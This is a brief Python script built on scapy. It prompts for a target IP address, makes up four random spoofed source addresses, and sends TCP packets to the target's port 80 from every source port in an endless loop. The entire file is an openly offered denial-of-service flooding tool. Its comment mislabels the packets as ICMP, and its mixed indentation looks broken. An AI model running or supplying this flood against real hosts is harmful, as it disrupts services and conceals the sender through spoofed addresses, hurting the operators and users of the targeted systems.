import random
import time
from scapy.all import *


#To give input of target IP
target_IP = raw_input("Enter IP address of Target: ")
i = 1

#Function to generate random IPs
def get_random_ip():
	ip = [str(random.randint(1,254)) for i in range(4)]
   	return '.'.join(ip)

ip_list = [get_random_ip() for i in range(4)]
print(ip_list)

#Condition to send ICMP packets using all ports
while True:   
   	for source_port in range(1,65535):
      		for source_IP in ip_list:
         		IP1 = IP(src= source_IP, dst= target_IP)
         		TCP1 = TCP(sport = source_port, dport = 80)
         		pkt = IP1 / TCP1
         		send(pkt,inter = .10)
       
         		print ("source ip",source_IP,"packet sent ", i)
         		i = i + 1

